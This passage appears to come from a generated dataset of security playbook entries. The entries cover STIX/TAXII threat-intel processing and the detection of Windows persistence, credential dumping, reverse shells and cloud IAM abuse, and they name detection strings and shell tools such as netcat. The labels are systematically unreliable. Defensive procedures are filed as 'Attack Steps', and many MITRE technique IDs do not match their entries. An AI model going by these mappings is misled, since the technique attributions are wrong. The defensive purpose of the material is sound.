- **Attack Steps**: 1. STIX bundles are downloaded via TAXII and stored as JSON in an internal Git repo. 2. A scheduled job parses these using stix2sigma, extracting patterns into Sigma rule format. 3. Hashes and domain indicators are converted to YARA rules with standardized naming. 4. All detection rules are assigned unique UUIDs and stored in a structured repo. 5. SOC platforms import these detection rules into SIEM and AV scanners. 6. Each rule includes metadata on source feed, threat actor, and confidence score. 7. Analysts get notified of new detections created from STIX IOCs. 8. Version control ensures rollback of flawed rules.
- **Detection**: Sigma, YARA
- **Solution**: Build rules from STIX patterns
- **Tags**: #IOC2YARA #IOC2Sigma

## Scheduled TAXII Pull Jobs with Fallback Mechanism for Feed Downtime

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: TAXII Client Infra
- **Vulnerability**: Feed unavailability
- **MITRE**: T1583.006
- **Impact**: Ensures uninterrupted intel sync
- **Tools**: TAXII Client, Failover Config
- **Scenario**: Ensuring reliability in automated feed ingestion by supporting secondary TAXII servers
- **Attack Steps**: 1. TAXII feed pulls are scheduled using cron jobs or task schedulers. 2. Each pull attempt includes a health check of the primary TAXII server. 3. If unavailable, the client auto-switches to a secondary mirror using fallback DNS or IP. 4. Pulled data is validated to prevent duplication and ensure format consistency. 5. A failover log tracks which source was used and at what time. 6. Alerts are generated if fallback is triggered more than 3 times within a 24-hour window. 7. This ensures continuous feed ingestion even during provider outages. 8. Operations team is notified for long-term failures.
- **Detection**: TAXII Health Check
- **Solution**: Add resilient ingestion mechanism
- **Tags**: #failover #TAXII

## Machine Learning Model Training on STIX Data for Threat Scoring

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: Threat Scoring Engine
- **Vulnerability**: Flat IOC value assignment
- **MITRE**: T1591.003
- **Impact**: Data-driven threat triage
- **Tools**: Python ML Stack, STIX2 Lib, Scikit-learn
- **Scenario**: Using historical STIX indicators to train a scoring model for IOC prioritization
- **Attack Steps**: 1. Past STIX data is parsed to extract features: type, confidence, last_seen, labels. 2. Indicators are manually labeled as True Positive or False Positive using past detection logs. 3. A decision-tree model is trained to score future indicators based on these features. 4. Model outputs risk scores that guide which IOCs are pushed to live detection engines. 5. False positive rate is continuously monitored and model retrained monthly. 6. Feedback from analysts is looped back into training data. 7. Model versioning ensures traceability. 8. IOC scoring is now ML-assisted rather than manual.
- **Detection**: Scikit-learn, STIX
- **Solution**: Score IOCs by historical value
- **Tags**: #ML4STIX #iocscoring

## Ingesting ATT&CK Mappings from STIX into Threat Modeling Tools

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: ATT&CK Map
- **Vulnerability**: Unmapped tactics
- **MITRE**: T1589.001
- **Impact**: Strategic threat modeling insights
- **Tools**: MITRE Navigator, STIX2, TaxiiClient
- **Scenario**: Parsing STIX AttackPattern objects and mapping them into ATT&CK Navigator
- **Attack Steps**: 1. STIX bundles containing attack-pattern objects are pulled via TAXII. 2. Objects are parsed for external_references linking to MITRE ATT&CK IDs (e.g., T1059). 3. A JSON translator maps these IDs to color-coded entries in ATT&CK Navigator. 4. Analysts visualize which techniques are most reported in incoming threat feeds. 5. Tactic-level heatmaps are used to identify coverage gaps in detection. 6. Color mappings are versioned to track TTP evolution over time. 7. Output is used in tabletop exercises and red-blue simulations. 8. Correlation across actors is displayed as technique clustering.
- **Detection**: MITRE Navigator
- **Solution**: Overlay STIX TTPs in ATT&CK
- **Tags**: #ATTACK #TTPmapping #STIX

## Parsing and Alerting on Embedded Malware Family References in STIX Descriptions

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: NLP Engine
- **Vulnerability**: Missed context in free text
- **MITRE**: T1592.001
- **Impact**: Enriches IOCs with malware links
- **Tools**: NLP Parser, TAXII Client
- **Scenario**: Extracting malware family names embedded in free-text descriptions of STIX objects
- **Attack Steps**: 1. Many STIX objects include malware family names in description fields. 2. A custom NLP parser is trained to detect and normalize malware names from these free-text fields. 3. Named entities like "TrickBot", "QakBot" are extracted and tagged onto the corresponding indicator. 4. Alerts from EDR tools are enriched with these family references for context. 5. Visualization of active malware families is enabled in CTI dashboards. 6. Feed validation includes standardizing synonyms (e.g., "QuackBot", "QBot"). 7. Extraction logs are archived for analyst audit. 8. NLP model is fine-tuned monthly based on unseen descriptions.
- **Detection**: NLP + STIX Parser
- **Solution**: Normalize malware mentions
- **Tags**: #malwareNLP #STIX #Qakbot

## Scheduled Expiry and IOC Aging in STIX Feeds

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: IOC Platform
- **Vulnerability**: Unmanaged IOC lifetime
- **MITRE**: T1589.003
- **Impact**: Eliminates stale threat data
- **Tools**: TAXII Fetcher, IOC Expiry Daemon
- **Scenario**: Managing lifecycle of indicators using valid_from and valid_until attributes
- **Attack Steps**: 1. Each STIX object includes timestamps marking its lifecycle. 2. A background process evaluates age of each IOC. 3. Expired indicators are automatically removed from active detection systems. 4. IOC dashboards display aging stats and upcoming expirations. 5. Analysts can override expiry for persistent threats. 6. Expiry logic reduces clutter in high-volume feed systems. 7. Expired indicators are archived for audit. 8. Feed quality is improved by enforcing data hygiene.
- **Detection**: STIX Expiry Logic
- **Solution**: Age-based IOC pruning
- **Tags**: #IOCexpiry #STIX

## Filtering and Blocking STIX Indicators with Legal Restrictions (e.g., EU GDPR Constraints)

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: Compliance Engine
- **Vulnerability**: Legal IOC misuse
- **MITRE**: T1583.004
- **Impact**: Avoids regulatory violations
- **Tools**: Data Loss Prevention (DLP), TLP Filter
- **Scenario**: Filtering indicators that contain sensitive or legally protected information
- **Attack Steps**: 1. Some STIX indicators contain personal or jurisdiction-restricted data (e.g., EU citizen IP logs). 2. A DLP engine scans all indicators for fields like whois, asn, or explicit IP geolocation. 3. If indicator origin falls under GDPR protection zones, it is flagged. 4. Only compliance-cleared personnel may view or act upon them. 5. IOC is tagged with legal constraints and is not pushed to global detection platforms. 6. Logs track who accessed what IOC and why. 7. Review process is enforced monthly with legal counsel. 8. Reduces regulatory exposure during threat intel sharing.
- **Detection**: DLP + GeoIP Filter
- **Solution**: Enforce privacy tagging
- **Tags**: #GDPR #compliance #STIXfilter

## Stream Processing of Live STIX Feeds via Kafka for Real-Time IOC Distribution

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: Infrastructure
- **Vulnerability**: Batch ingestion latency
- **MITRE**: T1584.004
- **Impact**: Enables real-time IOC distribution
- **Tools**: Kafka, TAXII Poller, STIX Parser, Redis
- **Scenario**: Handling high-volume STIX indicators from TAXII feeds and distributing them in real time across environments using Kafka
- **Attack Steps**: 1. A TAXII client continuously pulls live STIX bundles from various sources (MISP, IBM X-Force). 2. As bundles arrive, they are parsed by a lightweight Python microservice and broken down into atomic indicators. 3. Each indicator is tagged with feed origin, timestamp, threat category, and confidence level. 4. The parsed indicators are streamed into Kafka topics (e.g., ioc.ip, ioc.hash) based on type. 5. Consumer services (EDR, SIEMs, firewalls) subscribe to relevant Kafka topics and ingest IOCs in near-real time. 6. Redis is used to maintain a deduplication cache with TTL to avoid repeat ingestion. 7. Alert thresholds are dynamically updated based on IOC hit rates across consumers. 8. System dashboard monitors feed latency, ingestion volume, and IOC freshness for tuning.
- **Detection**: Kafka, Redis
- **Solution**: STIX → Kafka → IOC pipeline
- **Tags**: #Kafka #IOCstream #STIX

## Threat Actor Profiling via Aggregated STIX Relationship Objects

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: CTI Infrastructure
- **Vulnerability**: Flat actor metadata
- **MITRE**: T1592
- **Impact**: Enhanced actor-centric intel
- **Tools**: Neo4j, Python STIX2, MISP
- **Scenario**: Building comprehensive threat actor profiles by aggregating their related STIX objects (TTPs, malware, IOCs)
- **Attack Steps**: 1. STIX objects across multiple feeds are ingested into a Neo4j graph using stix2graph. 2. ThreatActor nodes are linked to associated attack-pattern, malware, tool, campaign, and indicator nodes using STIX relationship objects. 3. A profiling engine scores actors based on activity breadth (e.g., how many TTPs used), frequency, and recentness. 4. The system tags actors with metadata such as suspected country, primary sectors targeted, and kill chain stage focus. 5. Analysts can filter actors who share TTP clusters or target similar industries. 6. Profiles are rendered visually and updated in real time as new feeds arrive. 7. SOC teams use this to pivot between actors and their infrastructure for proactive defense. 8. Intel summaries are auto-generated for executive briefings.
- **Detection**: STIX2graph, Neo4j
- **Solution**: Build dynamic threat actor profiles
- **Tags**: #threatactors #graphintel

## Merging Custom Intel with STIX Feeds using Local Extensions

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: CTI Platform
- **Vulnerability**: Limited internal correlation
- **MITRE**: T1586
- **Impact**: Blends internal + external threat data
- **Tools**: MISP, Python STIX2, JSON Extender
- **Scenario**: Adding proprietary indicators and metadata to incoming STIX bundles via extensions for internal enrichment
- **Attack Steps**: 1. A STIX extension schema is defined for proprietary tags (e.g., internal incident ID, local incident rating). 2. After pulling STIX bundles, a processing script appends custom fields (under x_internal) to each relevant object. 3. These extended objects are stored separately from raw feeds to maintain chain of custody. 4. Analysts use enriched indicators for correlation with past internal breaches. 5. STIX extensions are validated to prevent corruption or non-compliance. 6. Local indicators are also converted into STIX objects and integrated into private TAXII feeds. 7. Shared feeds only expose base STIX without internal extensions. 8. This allows federated threat sharing while protecting sensitive internal context.
- **Detection**: STIX2 + Custom Extension
- **Solution**: Use x_fields to extend indicators
- **Tags**: #STIXcustom #internalintel

## Ingesting and Tagging Threat Infrastructure using STIX Indicators

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: Network Intel
- **Vulnerability**: Flat infrastructure tagging
- **MITRE**: T1583.001
- **Impact**: Role-aware threat blocking
- **Tools**: TAXII Client, Infrastructure Mapper
- **Scenario**: Automatically identifying infrastructure elements (IP, domains) and tagging them by threat type
- **Attack Steps**: 1. STIX bundles are pulled that contain indicator and infrastructure object types. 2. A custom parser maps indicators that relate to IPs, ASNs, domains, and assigns threat role tags: "C2 Server", "Downloader", "Phishing Host". 3. These tags are used to build blacklists segmented by function. 4. Firewall rules are automatically updated with segmented blocklists. 5. Internal telemetry is checked against tagged infrastructure for active matches. 6. Analysts can filter alerts by infrastructure type for better triage. 7. Historical graphs show infrastructure reuse patterns by threat actors. 8. Threat hunts are prioritized by infrastructure role (e.g., focus on "Initial Access" nodes).
- **Detection**: STIX2, Parser
- **Solution**: Enrich IOCs by infrastructure type
- **Tags**: #infrastructureSTIX #autotag

## Ingesting STIX2.1 Objects with Embedded MITRE ATT&CK References

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: ATT&CK Tools
- **Vulnerability**: Manual TTP mapping
- **MITRE**: T1587.001
- **Impact**: Strategic TTP visibility
- **Tools**: ATT&CK Navigator, stix2json
- **Scenario**: Parsing STIX attack-pattern objects and integrating directly with ATT&CK Navigator heatmaps
- **Attack Steps**: 1. STIX bundles are pulled via TAXII, including attack-pattern objects with MITRE technique references. 2. A parser extracts all external_references.source_name=mitre-attack. 3. These IDs are mapped into ATT&CK Navigator layers using JSON import templates. 4. Analysts visualize covered vs uncovered techniques in their current environment. 5. Layer views are shared across SOCs for consistent detection strategy. 6. Color coding shows threat frequency or recentness. 7. Updates are automated when new STIX feeds arrive. 8. This supports purple teaming and proactive detection planning.
- **Detection**: STIX2, Navigator
- **Solution**: Map TTPs from STIX to ATT&CK
- **Tags**: #attacknav #stix2

## Dynamic Decay Scoring of STIX Indicators Based on Hit Frequency

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: SIEM
- **Vulnerability**: Overloaded IOC rules
- **MITRE**: T1590.004
- **Impact**: Reduces stale indicator noise
- **Tools**: ElasticSearch, STIX2, Decay Engine
- **Scenario**: Scoring indicators lower over time unless observed again in internal logs
- **Attack Steps**: 1. STIX indicators ingested from TAXII feeds are timestamped and scored upon arrival. 2. If an IOC is not matched in internal logs within 7 days, decay score is applied. 3. Score drops exponentially per day of inactivity. 4. New hits reset the decay timer. 5. Low-scoring indicators are deprecated from alert rules to reduce noise. 6. Analysts can override decay manually. 7. Decay logs are audited to ensure no critical indicators were dropped. 8. System improves alert relevance and efficiency.
- **Detection**: Decay Engine
- **Solution**: Score indicators by time + hits
- **Tags**: #decaymodel #IOCweighting

## Federated Sharing of STIX with Partner Organizations over TAXII

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: CTI Infra
- **Vulnerability**: Manual email-based sharing
- **MITRE**: T1585.002
- **Impact**: Real-time trusted intel exchange
- **Tools**: OpenTAXII, MISP, Feed Manager
- **Scenario**: Sharing curated and sanitized STIX collections with trusted partners using TAXII
- **Attack Steps**: 1. Internal IOCs are curated based on campaign relevance and confidence. 2. Personally identifiable or restricted data is stripped before sharing. 3. The curated dataset is published on a private OpenTAXII server. 4. Partner orgs are issued API tokens and granted access to specific collections. 5. Feeds are version-controlled and tagged by sector (e.g., "Finance", "Healthcare"). 6. Feedback loops allow partners to submit sightings and enrich IOCs. 7. Analytics track which shared IOCs triggered detections at partner sites. 8. This improves collective defense while maintaining control.
- **Detection**: OpenTAXII
- **Solution**: Share curated STIX feeds
- **Tags**: #intelsharing #TAXII #partner

## Visualizing IOC Lifespan from STIX Validity Fields

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: IOC Analysis
- **Vulnerability**: Blind to IOC aging
- **MITRE**: T1591.004
- **Impact**: Supports IOC maintenance and cleanup
- **Tools**: Grafana, Python Parser, STIX2
- **Scenario**: Generating IOC lifecycle reports from valid_from and valid_until metadata in STIX
- **Attack Steps**: 1. All ingested STIX indicators are stored with timestamps and metadata in a time-series DB. 2. A visualization tool like Grafana plots IOC activity windows (appearance → expiration). 3. Analysts explore how long different malware families stay active. 4. IOC classes (domain, IP, hash) are compared for longevity trends. 5. Rapidly expiring indicators are deprioritized for long-term rulesets. 6. Visual dashboard enables hunt team to focus on persistent IOCs. 7. The data feeds also into cleanup scripts for obsolete rules. 8. Management reports highlight average threat duration by feed.
- **Detection**: Grafana, STIX2
- **Solution**: Plot IOC lifespan for triage
- **Tags**: #iocduration #grafana

## Pre-Ingestion STIX Sanitization for Broken Indicators and Anomalies

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: Threat Feed Hygiene
- **Vulnerability**: Ingested broken indicators
- **MITRE**: T1589.004
- **Impact**: Prevents ingestion failures
- **Tools**: STIX Linter, JSON Schema Validator
- **Scenario**: Detecting and correcting corrupted or incomplete STIX objects before ingestion
- **Attack Steps**: 1. TAXII feed is routed through a pre-processor. 2. A linter checks all required fields (e.g., missing pattern, malformed timestamps). 3. Broken entries are logged with line numbers and feed sources. 4. Correction heuristics attempt auto-fixes or flag for analyst review. 5. A pre-approved allowlist ensures malformed but known-valid entries are not excluded. 6. Cleaned indicators are passed to the STIX ingestion engine. 7. Failure patterns are documented to suggest improvements to feed providers. 8. Ensures integrity of threat ingestion.
- **Detection**: STIX Validator
- **Solution**: Lint and clean STIX objects
- **Tags**: #STIXlint #jsonfix

## Enforcing IOC Expiry by Expanding STIX valid_until Logic into Detection Engines

- **Attack Type**: STIX/TAXII Feed Processing
- **Target**: Detection Systems
- **Vulnerability**: Lifeless IOC clutter
- **MITRE**: T1591.005
- **Impact**: Dynamic rule lifecycle control
- **Tools**: Splunk, Sentinel, EDR, Expiry Engine
- **Scenario**: Pushing IOC expiry enforcement logic into detection systems using native STIX fields
- **Attack Steps**: 1. STIX indicators with valid_until tags are parsed and mapped to expiration fields in Splunk/Sentinel rules. 2. A background job checks IOC age hourly and disables expired detections. 3. Analysts receive alerts when high-confidence IOCs are about to expire. 4. Optionally, some IOC categories (APT, ransomware) are exempt from expiry. 5. Expired rules are archived and tagged. 6. This mechanism enforces time-bound intelligence lifecycle. 7. Prevents outdated or irrelevant indicators from generating noise. 8. Metrics show how expiry-based hygiene improves detection accuracy.
- **Detection**: Expiry Job, STIX2
- **Solution**: Auto-disable expired IOCs
- **Tags**: #iocvalidity #ruleexpiry

## Detecting Suspicious Scheduled Tasks Created via Native Binaries

- **Attack Type**: Task-Based Persistence Detection
- **Target**: Windows
- **Vulnerability**: LOLBins for Persistence
- **MITRE**: T1053.005
- **Impact**: Persistence via scheduled tasks
- **Tools**: Sysmon, Splunk, Wazuh, Elastic
- **Scenario**: Identifying adversaries creating tasks using schtasks.exe or at.exe to maintain persistence
- **Attack Steps**: 1. Configure Sysmon to capture process creation events (Event ID 1) with full command-line auditing. 2. Ingest Sysmon logs into SIEM (Splunk/Elastic) and monitor for suspicious schtasks.exe commands. 3. Build detection rules to alert on task names resembling random strings or mimicking legitimate apps. 4. Correlate task creation time with unusual user behavior (e.g., privilege escalation within last 5 minutes). 5. Parse Task Scheduler logs (Microsoft-Windows-TaskScheduler/Operational) to validate execution context. 6. If a suspicious task is found, check whether it spawns payloads from temp or user-writeable directories. 7. Quarantine affected endpoint and retrieve task definition files and registry persistence keys. 8. Submit payloads for static and dynamic analysis before taking wider containment action.
- **Detection**: Event Correlation
- **Solution**: Alert + Quarantine
- **Tags**: #LOLBins #TaskMonitor #BlueTeam

## Detecting Credential Dumping via LSASS Access

- **Attack Type**: Credential Access Monitoring
- **Target**: Windows
- **Vulnerability**: Memory access on LSASS
- **MITRE**: T1003.001
- **Impact**: Credential theft
- **Tools**: Sysmon, Process Hacker, WinDbg
- **Scenario**: Monitoring unauthorized access to LSASS memory by attackers using tools like Mimikatz
- **Attack Steps**: 1. Enable Sysmon Event ID 10 (Process Access) to capture memory access attempts on LSASS.exe. 2. Whitelist trusted processes like antivirus, backup tools to avoid false positives. 3. Ingest logs into SIEM and create alerts for any unsigned process trying to open LSASS memory. 4. Monitor for DLL injection attempts or unusual handle access via Process Explorer. 5. Use Wazuh or EDR telemetry to catch LSASS access over RDP sessions from lateral movement vectors. 6. If detected, isolate host and dump memory to investigate access context. 7. Search for loaded modules in LSASS memory for known credential dumping DLLs (e.g., mimilib.dll). 8. Rotate compromised credentials and issue alerts to IAM and HR systems if corporate accounts are affected.
- **Detection**: Process Access Auditing
- **Solution**: Alert + Rotate + Contain
- **Tags**: #CredentialAccess #LSASS #Mimikatz

## Defending Against Abused Signed Binaries (Signed Binary Proxy Execution)

- **Attack Type**: LOLBin Exploitation
- **Target**: Windows
- **Vulnerability**: Abused signed tools
- **MITRE**: T1218
- **Impact**: Evasion and execution via LOLBins
- **Tools**: Sysmon, Defender for Endpoint
- **Scenario**: Detecting abuse of legitimate Microsoft-signed binaries like InstallUtil.exe, msbuild.exe
- **Attack Steps**: 1. Enable process logging and command-line auditing via Sysmon for all LOLBins. 2. Deploy allowlist policies to restrict execution of known LOLBins from non-system locations. 3. Write detection rules for command-line flags like /install, /log that are abused in InstallUtil.exe. 4. Cross-reference parent-child process chains to spot LOLBins launching obfuscated scripts or binaries. 5. Configure Microsoft Defender ASR rules to block executable content via Office or unusual binaries. 6. Enrich alerts using threat intel if LOLBin usage matches patterns from known malware (e.g., FIN7, APT29). 7. Hunt for signs of staging activity: temp directories, obfuscated Base64 scripts. 8. Terminate processes and initiate IR workflow to analyze the initial infection vector.
- **Detection**: LOLBin flag detection
- **Solution**: Monitor + Block + Hunt
- **Tags**: #LOLBins #signedbinary #T1218

## Detecting Fileless Malware Through Memory Anomalies

- **Attack Type**: Fileless Threat Detection
- **Target**: Windows
- **Vulnerability**: Memory-only payloads
- **MITRE**: T1055
- **Impact**: Covert in-memory persistence
- **Tools**: Volatility, Sysmon, EDR, Rekall
- **Scenario**: Detecting payloads injected directly into memory without writing to disk
- **Attack Steps**: 1. Configure EDR to alert on unusual memory allocations from scripting engines (e.g., powershell.exe spawning mshta.exe). 2. Enable Sysmon Event ID 7 to log image loads in memory, especially unsigned DLLs. 3. Perform memory snapshots during suspicious process behavior. 4. Use Volatility or Rekall to scan for injected code sections, shellcode signatures, or reflectively loaded DLLs. 5. Compare loaded module paths to known disk locations — unmatched entries may indicate fileless implants. 6. Extract memory regions and submit to sandbox for dynamic behavior analysis. 7. Monitor process hollowing via suspicious process memory regions that don’t match the expected PE layout. 8. Apply memory carving techniques to locate de-obfuscated payloads for reverse engineering.
- **Detection**: Volatility, SIEM
- **Solution**: Dump + Analyze + Detect
- **Tags**: #fileless #memoryforensics

## Threat Hunting via PowerShell Logging and Script Block Analysis

- **Attack Type**: Scripting Abuse Detection
- **Target**: Windows
- **Vulnerability**: Obfuscated script abuse
- **MITRE**: T1059.001
- **Impact**: Script-based payload delivery
- **Tools**: PowerShell Logging, Splunk, Sysmon
- **Scenario**: Identifying malicious scripts using deep PowerShell audit logging and block transcription
- **Attack Steps**: 1. Enable Module, Script Block, and Transcription logging in Group Policy. 2. Use AMSI integration to analyze real-time script execution even when obfuscated. 3. Monitor PowerShell Event IDs 4104 (script block) and 4103 (module logging). 4. SIEM alerts should trigger on suspicious strings like Invoke-WebRequest, DownloadString, Add-MpPreference. 5. Extract encoded blocks and recursively decode Base64 or XOR patterns. 6. Correlate script blocks with parent process lineage to spot execution from Office macros or HTA. 7. Maintain script fingerprinting to spot reused malware families (Emotet, Cobalt Strike loaders). 8. Alert, isolate, and tag scripts for IOC feed back to SOC rulebase.
- **Detection**: Event ID 4104
- **Solution**: Decode + Alert
- **Tags**: #PowerShellHunt #scriptblock

## Post-Incident Audit of Firewall Evasion via Cloud Proxies

- **Attack Type**: Network Evasion Detection
- **Target**: Network
- **Vulnerability**: Bypass over cloud infra
- **MITRE**: T1090.003
- **Impact**: Cloud-based evasion & exfiltration
- **Tools**: Proxy Logs, Zscaler, Deep Packet Inspection
- **Scenario**: Identifying exfiltration or command-and-control using trusted cloud services like Dropbox, Google Docs
- **Attack Steps**: 1. Review DNS and HTTP logs to detect connections to known proxy-evading services (e.g., ngrok, pastebin, DiscordCDN). 2. Analyze traffic volumes and frequency to detect abnormal data transfer patterns. 3. Use SSL inspection or Zscaler-type proxies to parse encrypted payload contents if policy allows. 4. Identify C2-beacons hiding in HTTP POST payloads or cloud API interactions. 5. Cross-reference user activity timelines with cloud uploads or webhooks. 6. Tag suspected endpoints and monitor for scheduled exfiltration attempts (e.g., every 4 hours). 7. Alert SOC on non-whitelisted services being accessed frequently over HTTPs. 8. Review firewall egress policies and implement FQDN filtering + block public proxy tools.
- **Detection**: Traffic Correlation
- **Solution**: Block + Inspect
- **Tags**: #cloudproxy #firewallevasion

## USB Forensics After Malware Introduction

- **Attack Type**: Removable Media Investigation
- **Target**: Endpoint
- **Vulnerability**: USB-based payloads
- **MITRE**: T1200
- **Impact**: Physical media malware delivery
- **Tools**: USBDeview, FTK Imager, Sysmon
- **Scenario**: Investigating infections or data exfiltration via USB devices
- **Attack Steps**: 1. Examine registry keys under SYSTEM\CurrentControlSet\Enum\USBSTOR to identify connected devices. 2. Use USBDeview or FTK Imager to view serial numbers, volume names, mount history. 3. Correlate connection times with known alerts or user login sessions. 4. Analyze autorun files or suspicious dropped executables from removable drives. 5. Use forensic imaging tools to capture full USB content for malware analysis. 6. Trace file transfer history using RecentDocs, prefetch, and $LogFile records. 7. Determine whether USB was used for staging, payload delivery, or data theft. 8. Cross-reference endpoint AV logs for any detection suppressed via USB.
- **Detection**: Registry + File System
- **Solution**: Correlate + Forensically Dump
- **Tags**: #usbforensics #removabledrive

## Detecting Reverse Shells Initiated from Infected Endpoints

- **Attack Type**: C2 Channel Detection
- **Target**: Endpoint/Network
- **Vulnerability**: Outbound shell tunnel
- **MITRE**: T1059.003
- **Impact**: Remote control of infected hosts
- **Tools**: Netstat, Suricata, EDR
- **Scenario**: Identifying command shells sent out to attacker-controlled servers
- **Attack Steps**: 1. Continuously monitor outbound TCP connections using netstat, Suricata or endpoint telemetry. 2. Flag unusual ports (e.g., 1337, 9001, 8088) not associated with regular services. 3. Detect long-lived connections to IPs not in DNS or from suspicious ASN ranges. 4. Alert on reverse shell behavior patterns — cmd.exe, powershell.exe launching connect-like syntax. 5. Examine packet payloads for shell prompts or ASCII command strings. 6. Correlate alert with previous privilege escalation or lateral movement steps. 7. Contain infected system and block remote IP via firewall. 8. Initiate malware extraction and attribution based on shell tool used (netcat, socat, custom).
- **Detection**: Port + Shell Pattern
- **Solution**: Alert + Block + Traceback
- **Tags**: #reverseshell #networkhunt

## Monitoring Logon Anomalies Using Kerberos Events

- **Attack Type**: Identity Attack Detection
- **Target**: AD / IAM
- **Vulnerability**: Ticket forging
- **MITRE**: T1558.001
- **Impact**: Privilege abuse via forged auth
- **Tools**: Event Logs, KQL, Sentinel
- **Scenario**: Detecting Pass-the-Ticket, Golden Ticket, or anomalous Kerberos ticket issuance
- **Attack Steps**: 1. Monitor Event ID 4769 (Kerberos Ticket Request) and Event ID 4624 (Logon) for suspicious service tickets. 2. Alert on requests for multiple high-privilege service tickets in short periods. 3. Compare ticket lifetime and checksum with expected values — anomalies may point to forged tickets. 4. Check for use of RC4 encryption types in tickets, often used by attackers to simplify ticket forging. 5. Match ticket requestors with service account usage hours (e.g., off-hours privilege use). 6. If Golden Ticket is suspected, check KRBTGT account history and TGT issuance patterns. 7. Force Kerberos ticket purge and reset passwords of impacted service accounts. 8. Notify IAM and initiate environment-wide trust reestablishment procedures.
- **Detection**: Event Correlation
- **Solution**: Detect + Reset + Purge
- **Tags**: #kerberos #goldenticket

## Detecting Suspicious File Execution from Temp or AppData Folders

- **Attack Type**: Execution Pattern Detection
- **Target**: Endpoint
- **Vulnerability**: Hidden execution location
- **MITRE**: T1204.002
- **Impact**: Execution from user folders
- **Tools**: Sysmon, EDR, Defender ATP
- **Scenario**: Catching malware executed from non-standard locations
- **Attack Steps**: 1. Monitor for process creation from directories like %AppData%, %Temp%, %ProgramData%. 2. Use Sysmon Event ID 1 and filter parent-child execution chains with unsigned child processes. 3. Alert if signed Microsoft binaries are spawning processes from these folders. 4. Enrich telemetry with hash lookups and threat intel enrichment. 5. Flag behavior like document files spawning scripting engines (winword.exe → wscript.exe). 6. Conduct memory scan for obfuscated command-line usage or LOLBins. 7. Sandbox suspect binaries or extract memory for post-execution triage. 8. Auto-tag endpoint for further IR based on threat score aggregation.
- **Detection**: Folder Heuristics
- **Solution**: Alert + Sandbox + Triage
- **Tags**: #tempfolder #hiddenexec

## Detection of Unauthorized IAM Policy Change via AWS Console

- **Attack Type**: IAM Policy Tampering
- **Target**: AWS IAM
- **Vulnerability**: Unrestricted Policy Attach
- **MITRE**: T1098.003
- **Impact**: Privilege escalation
- **Tools**: AWS CloudTrail, AWS Config, SIEM (Splunk, ELK), AWS GuardDuty
- **Scenario**: Attacker abuses stolen session or compromised account to attach AdministratorAccess policy to user or role
- **Attack Steps**: 1. Enable CloudTrail to log all Put*Policy and Attach*Policy actions across all regions. 2. Configure CloudTrail to send logs to S3 and forward to SIEM or use CloudWatch Log Insights. 3. Create an alerting rule that triggers when AttachUserPolicy or AttachRolePolicy includes AdministratorAccess or custom overly permissive policies. 4. Enrich the log context with userAgent, sourceIPAddress, and compare with known admin behavior baselines. 5. Correlate with recent sign-in events from the same principal using CloudTrail's ConsoleLogin entries. 6. If the IP or userAgent is new or foreign, flag as anomaly and trigger IR workflow. 7. Confirm if the user had legitimate need to escalate; otherwise, remove the policy attachment via console or CLI. 8. Rotate keys and invalidate session tokens associated with compromised identity.
- **Detection**: Event correlation on CloudTrail
- **Solution**: Detach policy + Rotate creds
- **Tags**: #aws #iam #policy #cloudtrail

## Detecting AWS Console Login from Suspicious Country

- **Attack Type**: Anomalous Sign-In
- **Target**: AWS IAM
- **Vulnerability**: Geographic login anomaly
- **MITRE**: T1078
- **Impact**: Identity misuse
- **Tools**: AWS CloudTrail, GuardDuty, AWS Detective
- **Scenario**: Alert when root or IAM users log in from foreign or high-risk geolocations
- **Attack Steps**: 1. In CloudTrail, enable logging for all ConsoleLogin events including additionalEventData. 2. Forward these events to GuardDuty or custom lambda log processing pipeline. 3. Compare the sourceIPAddress against known GeoIP ranges and enterprise allowlists. 4. If login originates from high-risk countries (e.g., North Korea, Iran), flag the session. 5. Inspect MFAUsed and responseElements.ConsoleLogin fields — if MFA is absent or login fails multiple times before success, raise severity. 6. Cross-reference IP address against known threat intelligence feeds using GuardDuty or ThreatFox. 7. Initiate containment: disable console access, require password reset, and notify user via SecOps. 8. Document incident and correlate with API calls issued post-login to determine intent.
- **Detection**: Anomaly + Threat intel correlation
- **Solution**: Access revocation + monitoring
- **Tags**: #aws #loginmonitor #cloudsecurity

## Detection of Azure Privilege Escalation via Role Assignment

- **Attack Type**: Role Elevation Abuse
- **Target**: Azure IAM
- **Vulnerability**: Overprivileged role assignment
- **MITRE**: T1098.001
- **Impact**: Privilege gain
- **Tools**: Azure Activity Logs, Azure AD Sign-In Logs, Microsoft Sentinel
- **Scenario**: Attacker assigns Owner or Contributor role to themselves or a compromised identity
- **Attack Steps**: 1. Monitor Azure Activity Logs for Microsoft.Authorization/roleAssignments/write events. 2. Create Sentinel rule that filters role assignments containing Owner, Contributor, or custom privileged roles. 3. Extract principalId, principalType, and scope to determine which user/identity was modified. 4. Correlate this event with recent sign-ins from Azure AD Sign-In Logs and validate if MFA was bypassed. 5. If initiatedBy.userAgent is suspicious (e.g., python-requests or non-browser), flag for further analysis. 6. Use Azure Resource Graph to identify downstream impact: what resources the user now controls. 7. Revoke token access and remove role assignment immediately if not justified. 8. Initiate post-incident forensics and conduct full Azure AD investigation.
- **Detection**: RoleAssignment write detection
- **Solution**: Remove + Rotate + Audit
- **Tags**: #azure #roleabuse #sentinel

## CloudTrail Alert on SecretsManager Enumeration

- **Attack Type**: Secrets Exposure Monitoring
- **Target**: AWS Secrets Manager
- **Vulnerability**: Unusual secret access
- **MITRE**: T1552.004
- **Impact**: Credential theft
- **Tools**: AWS CloudTrail, GuardDuty, SIEM
- **Scenario**: Attacker tries to list or access secrets using ListSecrets or GetSecretValue APIs
